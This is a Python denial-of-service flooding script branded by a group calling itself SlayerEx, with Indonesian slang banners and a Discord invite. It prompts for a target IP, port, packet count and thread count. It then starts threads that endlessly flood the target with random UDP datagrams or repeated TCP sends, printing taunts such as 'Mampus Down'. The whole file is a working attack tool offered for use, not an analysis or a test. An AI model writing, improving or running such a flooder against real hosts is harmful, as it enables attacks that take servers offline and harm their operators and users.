#!/usr/bin/env python3
#Abuse Gua Tampol Luh
#Jagan Abuse Asu_-
#SlayerEx Team : https://discord.gg/r6bUWksd5c
import random
import socket
import threading
import os

os.system("clear")
print("Ddos By SlayerEx")
print("Jagan Lupa Join SlayerEx")
print("Awas Lu Rename")
print("Aowkwowok")
ip = str(input(" Ip Server: "))
port = int(input(" Port: "))
choice = str(input(" Gas Yok(y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" </SlayerEx>")
		except:
			print("[!] Mampus Down")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Slayerex dek")
		except:
			s.close()
			print("[*] Down Lagi Coy")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
